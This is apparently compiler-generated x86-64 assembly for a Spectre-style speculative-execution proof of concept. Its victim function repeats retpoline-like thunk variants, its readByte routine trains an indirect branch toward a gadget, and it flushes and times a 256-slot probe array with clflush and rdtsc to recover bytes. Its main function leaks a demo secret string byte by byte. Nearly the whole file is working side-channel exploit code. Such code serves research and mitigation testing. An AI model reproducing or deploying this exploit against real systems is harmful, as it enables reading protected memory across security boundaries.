	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000992
	jmp	.Lgg_retpol_after_000992
.Lgg_retpol_thunk_000992:
	callq	.Lgg_retpol_setup_000992
.Lgg_retpol_cap_000992:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000992
.Lgg_retpol_setup_000992:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000992:
	jmp	.Lvictim_win0_continue
## Variant 993
.Lvictim_win0_var993:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000993
	jmp	.Lgg_retpol_after_000993
.Lgg_retpol_thunk_000993:
	callq	.Lgg_retpol_setup_000993
.Lgg_retpol_cap_000993:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000993
.Lgg_retpol_setup_000993:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000993:
	jmp	.Lvictim_win0_continue
## Variant 994
.Lvictim_win0_var994:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000994
	jmp	.Lgg_retpol_after_000994
.Lgg_retpol_thunk_000994:
	callq	.Lgg_retpol_setup_000994
.Lgg_retpol_cap_000994:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000994
.Lgg_retpol_setup_000994:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000994:
	jmp	.Lvictim_win0_continue
## Variant 995
.Lvictim_win0_var995:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000995
	jmp	.Lgg_retpol_after_000995
.Lgg_retpol_thunk_000995:
	callq	.Lgg_retpol_setup_000995
.Lgg_retpol_cap_000995:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000995
.Lgg_retpol_setup_000995:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000995:
	jmp	.Lvictim_win0_continue
## Variant 996
.Lvictim_win0_var996:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000996
	jmp	.Lgg_retpol_after_000996
.Lgg_retpol_thunk_000996:
	callq	.Lgg_retpol_setup_000996
.Lgg_retpol_cap_000996:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000996
.Lgg_retpol_setup_000996:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000996:
	jmp	.Lvictim_win0_continue
## Variant 997
.Lvictim_win0_var997:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000997
	jmp	.Lgg_retpol_after_000997
.Lgg_retpol_thunk_000997:
	callq	.Lgg_retpol_setup_000997
.Lgg_retpol_cap_000997:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000997
.Lgg_retpol_setup_000997:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000997:
	jmp	.Lvictim_win0_continue
## Variant 998
.Lvictim_win0_var998:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000998
	jmp	.Lgg_retpol_after_000998
.Lgg_retpol_thunk_000998:
	callq	.Lgg_retpol_setup_000998
.Lgg_retpol_cap_000998:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000998
.Lgg_retpol_setup_000998:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000998:
	jmp	.Lvictim_win0_continue
## Variant 999
.Lvictim_win0_var999:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000999
	jmp	.Lgg_retpol_after_000999
.Lgg_retpol_thunk_000999:
	callq	.Lgg_retpol_setup_000999
.Lgg_retpol_cap_000999:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000999
.Lgg_retpol_setup_000999:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000999:
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
